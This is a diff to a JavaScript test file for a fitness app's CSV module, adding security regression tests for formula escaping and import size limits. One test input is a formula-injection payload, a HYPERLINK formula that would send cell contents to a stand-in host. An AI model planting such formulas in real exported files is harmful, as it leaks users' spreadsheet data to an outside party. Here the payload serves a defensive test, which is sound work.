@@ -1,7 +1,7 @@
 import assert from 'node:assert/strict';
 import test from 'node:test';
 
-import { applyImport, bodyCsv, csvDate, mealsCsv, guessGroup, parseCsv, previewImport, readWorkoutCsv, toCsv } from './csv.js';
+import { applyImport, bodyCsv, CSV_MAX_ROWS, csvDate, mealsCsv, guessGroup, parseCsv, previewImport, readWorkoutCsv, toCsv } from './csv.js';
 
 const base = () => ({
   exercises: [{ id: 1, name: 'Bench Press', muscle_group: 'Chest' }],
@@ -79,4 +79,26 @@ test('preview skips duplicates; import adds workouts and new exercises only', ()
 test('body and meal CSVs', () => {
   assert.equal(bodyCsv({ body_logs: [{ log_date: '2026-11-01', weight_kg: 82, waist_cm: 90 }] }), 'date,weight_kg,waist_cm,chest_cm,arm_cm,hips_cm,thigh_cm,sleep_hours\n2026-11-01,82,90,,,,,\n');
   assert.match(mealsCsv({ meal_logs: [{ log_date: '2026-11-01', meal_slot: 'lunch', completed: true, option_key: 'option_a' }] }), /2026-11-01,lunch,yes,option_a,\n$/);
+});
+
+test('pentest PT-04: cells a spreadsheet would run as formulas come out as text', () => {
+  const d = base();
+  d.exercises[0].name = '=HYPERLINK("https://x.example/?d="&A1,"hi")';
+  d.workouts[0].notes = '@SUM(1+1)';
+  const csv = toCsv(d);
+  assert.equal(/(^|,)"?[=@+]/m.test(csv), false, csv);
+  assert.match(csv, /'=HYPERLINK/);
+  assert.match(csv, /'@SUM/);
+  // A plain negative number stays a number.
+  d.workouts[0].sets[0].weight_kg = -5;
+  assert.match(toCsv(d), /,-5,/);
+});
+
+test('pentest PT-05: a workout CSV has size, row and name limits', () => {
+  const head = 'Date,Workout Name,Exercise Name,Set Order,Weight,Reps\n';
+  const row = '2026-11-01 07:00:00,Push,Bench Press,1,50,5\n';
+  assert.throws(() => readWorkoutCsv(head + row.repeat(CSV_MAX_ROWS + 1)), /more than/);
+  const long = readWorkoutCsv(`${head}2026-11-01 07:00:00,${'P'.repeat(500)},${'B'.repeat(500)},1,50,5\n`);
+  assert.equal(long.workouts[0].label.length, 120);
+  assert.equal(long.workouts[0].sets[0].exercise.length, 120);
 });
